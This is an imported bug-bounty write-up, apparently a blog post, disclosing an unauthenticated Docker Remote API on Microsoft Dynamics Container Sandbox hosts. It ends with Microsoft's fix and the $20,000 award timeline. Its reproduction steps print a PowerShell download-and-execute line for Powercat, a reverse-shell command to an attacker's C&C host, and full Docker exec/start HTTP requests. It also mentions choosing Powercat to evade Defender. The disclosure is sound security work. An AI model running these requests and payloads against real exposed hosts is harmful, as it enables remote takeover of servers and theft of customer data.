---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-01_microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-2.md
original_filename: 2022-06-01_microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-2.md
title: Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote
  API 20,000$ Bounty
category: documents
detected_topics:
- command-injection
- otp
- cloud-security
tags:
- imported
- documents
- command-injection
- otp
- cloud-security
language: en
raw_sha256: 80ae5d3c53d777f05cab76e1a21b01f7bd0278a53595c76364a23afa1fd709b6
text_sha256: d35170d9b17cb3d1ed2277808dcdf84b2534abfea21a305a9e9b0347378c57e1
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-01_microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-2.md
- Source Type: markdown
- Detected Topics: command-injection, otp, cloud-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `80ae5d3c53d777f05cab76e1a21b01f7bd0278a53595c76364a23afa1fd709b6`
- Text SHA256: `d35170d9b17cb3d1ed2277808dcdf84b2534abfea21a305a9e9b0347378c57e1`


## Content

---
title: "Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty"
url: "https://hencohen10.medium.com/microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-20-000-bounty-7f726340a93b"
authors: ["Chen Cohen (@chencococococo)"]
programs: ["Microsoft"]
bugs: ["RCE"]
bounty: "20,000"
publication_date: "2022-06-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2590
scraped_via: "browseros"
---

# Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty

Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty
Chen Cohen
Follow
5 min read
·
Jun 1, 2022

66

1

On 17.11.2021 I reported a critical security issue in Microsoft Dynamics Container Sandbox, that allows Microsoft Customers to setup a “sandboxed” environment in Azure or on prem at customer’s.

The issue only affected customers who created Dynamics sandbox on Azure.

The Sandbox environment is built from one container which is pre-built by Microsoft.

So what happened?

There was a misconfiguration on the host of the Container Sandbox, leaving the Docker Remote API exposed after the Installation was done.

The Docker Remote API was listening on any interface on port 2375 without authentication.

What Is Docker Remote API?

Having access to the Docker Remote API is equivalent to giving administrator access to the server. With this access in hand, an attacker can access any container on the server. In this blog post I will demonstrate how I created the sandbox environment and abused the Docker Remote API to get Remote Code Execution on the Business Central container. Although this is a “Sandbox” environment for development, customers can choose to upload their Production Data. This is stated on the Microsoft Dynamics page.

Press enter or click to view image in full size
Microsoft Stating that Production data can be uploaded to the sandboxed environment

Setting up the Sandbox environment on Azure

1. Login to Dynamics 365

2. In the search bar search for “sandbox”

3. Select “Container Sandbox Environment”

4. Choose “Host in Azure”

5. You will be redirected to the link https://aka.ms/BCSandboxAzure?platform=19.0.29884.32383&application=19.0.29894.30403&family=US

6. Fill in the details for the server, VM name, Admin password, SQL password, ETC.

7. Press “Review + Create”

8. Click Next

9. Wait about 1–2 hours until the deployment is finished

10. After Installation is complete, the server will reboot automatically.

Steps To Reproduce the Remote Code Execution on Dynamics Container Sandbox:

as we already know, the docker remote API can be used for different types of actions, such as providing information about running containers.

Step1: Get some Info

Visit the following URL: http://<serverip>:2375/containers/json and copy the ID parameter to a note

Press enter or click to view image in full size
Docker Remote API Provides information about running container(s).

Step2: Create and Download the Reverse Shell payload to the server via the Docker Remote API

The next step is to create a reverse shell payload (I used Powercat for this mission, because whenever I tried a simple payloads such as msfvenom or other known payloads, they were deleted from the server by Microsoft Defender.)

2.1: Create a text file with the following content:

IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') // this will download and load the PowerCat Function to the system

powercat -c <C&C IP> -p <C&C PORT> -e cmd // this will make connection to the C&C server with PowerCat and give us CMD prompt.

Save the file with the extension of .ps1

2.2: Now that the reverse shell payload is ready, host the PowerShell script on any external web service.

2.3 Listen on your desired port(mine is 4242!) on your C&C server.

Getting ready for Reverse Shell connections

Step 3: Download the Reverse shell payload to the container

After the C&C Server is Ready for connections and the payload is hosted on external service, it’s time for the next step. Download the reverse shell payload to the Container via the unauthenticated Docker Remote API.

In order to execute a command on the container via the Docker Remote API, first create a command request (exec endpoint), and then initiate the command on the container (start endpoint). these are two different endpoints.

Get Chen Cohen’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

3.1 Create a command request, this will create a request to download and save the reverse shell payload on C:\Run\script.ps1:

POST /containers/<ContainerID-That-copied-before>/exec HTTP/1.1

Content-Type: application/json

User-Agent: PostmanRuntime/7.28.4

Accept: */*

Postman-Token: 928044fc-bed0–43a9–9c3c-aa360bbf5139

Host: DynamicsServerIP:2375

Accept-Encoding: gzip, deflate

Connection: close

Content-Length: 159

{

“AttachStdin”: false,

“AttachStdout”: true,

“AttachStderr”: true,

“Cmd”: [“curl”, “http://IP-Of-Webserver-That-Hosts-the-Reverse-Payload/script.ps1", “-o”, “C:\\Run\\script.ps1” ]

Press enter or click to view image in full size
A successful operation of exec endpoint will provide output of an ID that we will use in the next step to initiate the command on the container. Keep this ID.

3.2: Initiate the command execution by sending the following request to “start” endpoint

POST /exec/<ID-Of-Command-From-Last-Step>/start HTTP/1.1

Content-Type: application/json

User-Agent: PostmanRuntime/7.28.4

Accept: */*

Postman-Token: e0aa585e-cd72–45d9–940f-f3e3208f8217

Host: 13.90.247.183:2375

Accept-Encoding: gzip, deflate

Connection: close

Content-Length: 40

{

“Detach”: false,

“Tty”: false

}

Press enter or click to view image in full size
The Output from the Curl command used to download the reverse shell. this output means that the payload was downloaded successfully to the container into C:\\Run\\script.ps1

Step 4: Execute the Reverse Shell and achieve RCE

Everything is ready to own the Sandbox container, the Powercat is downloaded to the desired location, the only thing left is to initiate the reverse shell connection. this requires re-running the same steps (3.1 and 3.2), but now for the Powercat script.

4.1: Send the following to create a command request:

POST /containers/<ContainerID>/exec HTTP/1.1

Content-Type: application/json

User-Agent: PostmanRuntime/7.28.4

Accept: */*

Postman-Token: f0d80ae0-b646–4e38-b65c-5d1b6d75bb46

Host: <ServerIP>:2375

Accept-Encoding: gzip, deflate

Connection: close

Content-Length: 112

{

“AttachStdin”: false,

“AttachStdout”: true,

“AttachStderr”: true,

“Cmd”: [“powershell”, “C:\\Run\\script.ps1” ]

}

4.2: Initiate the command execution by sending the following request to “start” endpoint

POST /exec/<ID-OF-Last-Output>/start HTTP/1.1

Content-Type: application/json

User-Agent: PostmanRuntime/7.28.4

Accept: */*

Postman-Token: d3a5f448–16f5–4680-b431–4dd83d085c27

Host: <ServerIP>:2375

Accept-Encoding: gzip, deflate

Connection: close

Content-Length: 40

{

“Detach”: false,

“Tty”: false

}

Press enter or click to view image in full size
After the Start endpoint was hit, I Immediately received a connection to my C&C server from the Dynamics Container Sandbox.

Microsoft mitigated this issue by simply setting the Docker Remote API configuration to listen to UNIX socket only(Default Behavior).

Timeline

17.11.2021 Report sent to Microsoft

01.12.2021 Microsoft fixes the issue

06.12.2021 Microsoft awarded $15,000 for Remote Code Execution with Severity Important(hmm you specified Production data could be there!)

06.12.2021 Sent note disagreeing on severity and category due to exposure of production data

07.01.2022 Microsoft refuses to change the category to Azure even though it is deployed on Azure, but raises the issue severity to Critical, and awards an additional $5,000.
